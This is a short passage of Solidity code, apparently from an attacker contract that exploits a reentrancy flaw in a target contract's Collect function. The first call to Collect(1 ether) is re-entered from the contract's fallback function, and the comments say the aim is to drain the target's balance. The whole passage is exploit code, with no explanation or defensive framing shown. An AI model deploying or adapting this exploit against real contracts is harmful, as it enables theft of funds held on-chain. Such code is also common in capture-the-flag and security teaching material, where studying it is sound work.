        attackDone = false;
        // This will call Collect(1 ether). The fallback will reenter.
        c.Collect(1 ether);
        attackDone = true;
    }

    fallback() external payable {
        if (!attackDone) {
            // Reenter with another Collect to drain balance
            c.Collect(1 ether);
        }
    }
